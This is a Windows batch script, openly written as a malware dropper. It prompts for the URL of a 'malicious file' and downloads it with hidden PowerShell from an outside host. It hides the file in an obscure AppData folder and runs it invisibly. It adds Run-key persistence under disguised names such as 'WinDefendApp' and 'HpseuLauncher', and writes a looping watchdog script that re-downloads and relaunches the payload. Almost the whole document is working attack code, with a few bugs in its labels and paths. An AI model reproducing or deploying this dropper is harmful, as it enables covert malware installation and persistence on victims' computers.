@echo off
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinDefendApp" >nul 2>&1
if %errorlevel% equ 0 (
    goto existcheck
) else (
    goto regadd
)
:regadd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinDefendApp" /t REG_SZ /d "%~dp0/Dropper.bat" /f >nul 2>&1
goto exist check
:existcheck
if exist "%userprofile%\appdata\roaming\ifhoisudhifuhsiudhf\%name1%" (
    powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& { Start-Process -FilePath '%USERPROFILE%\\AppData\\Roaming\\ifhoisudhifuhsiudhf\\inf.bat' -WindowStyle Hidden }"
) else (
    goto ccccc
)
:ccccc
:: Changes the Color to a blue type color
color 0B
:: Asks basic questions for the dropper
echo file name? [Add the file type at the end of the name e.g. .bat, .exe, .py, .ps1, .txt]
set /p name1=">> "
echo Whats the URL to the malicious file? [Replace dl=0 with dl=1 on the end of the dropbox link if your using dropbox]
set /p droplink=">> "
echo do you want a legitimate looking registry key name? (Y/N)
set /p rege=">> "
if /i "%rege%"=="Y" (
    set "reges=HpseuLauncher"
    echo Registry key name = HPseuLauncher
    pause
    goto cc
) else (
    set "reges=%name1%"
    echo Registry key name = "%name1%"
    pause
    goto cc
)
:cc
:: Sets all the specific needs for the powershell scripts
set "target_dir=%USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"
set "exe_name=%name1%"
set "full_path=%target_dir%\%exe_name%"
set "dropbox_url=%droplink%"
set "Name=%name1%"
:: Makes the target directory
if exist %target_dir% (
    goto exist
) else (
    echo %target_dir% not found... making...
    pause
    mkdir %target_dir%
    goto exist
)
:exist
:: Installer powershell command
powershell -windowstyle Hidden -Command "& { $ProgressPreference = 'SilentlyContinue'; if (!(Test-Path '%target_dir%')) { New-Item -ItemType Directory -Path '%target_dir%' -Force }; Invoke-WebRequest -Uri '%dropbox_url%' -OutFile '%full_path%' }"
if exist %full_path% (
    goto other
) else (
    echo Error script not found. Make sure you have an internet connection
    exit /b
)
:other
attrib +h "%target_dir%" /S /D
attrib +h "%full_path%"
:: Runs the script
powershell -windowstyle Hidden -Command "& { Start-Process -FilePath '%full_path%' -WindowStyle Hidden }"
echo Successfully ran %name1% at %full_path%
:: Adds persistence using regedit [Admin perms not needed for the current user but if you want it to be machine wide this would be modified and had to be run as an administrator]
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%reges%" /t REG_SZ /d "%full_path%" /f
echo Successfully Installed %name1%...
goto inf
:: Creates a batch file that checks if the file is running and installed
:inf
echo @echo off > %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat
echo :loop >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat
echo if not exist "%full_path%" ( >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& { $ProgressPreference = 'SilentlyContinue'; if (!(Test-Path '%target_dir%')) { New-Item -ItemType Directory -Path '%target_dir%' -Force }; Invoke-WebRequest -Uri '%dropbox_url%' -OutFile '%full_path%' }" >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat
echo powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& { Start-Process -FilePath '%full_path%' -WindowStyle Hidden }" >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat
echo ) >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo tasklist /fi "imagename eq %name1%" 2>nul | findstr /i "%name1%" >nul >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo if %errorlevel% equ 1 ( >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& { Start-Process -FilePath '%full_path%' -WindowStyle Hidden }" >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo ) >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo goto loop >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
echo 
:: checks if the registry key is there
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HPseuLaunchAssist" >nul 2>&1
if %errorlevel% equ 0 (
    :: if the registry key is there it will js exit
    goto end
) else (
    :: if its not it will add it then exit
    goto regist
)
:regist
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HPseuLaunchAssist" /t REG_SZ /d "%USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat" /f
goto end
:end
:: starts the batch file in the background for checking
echo script done.
pause
exit /b
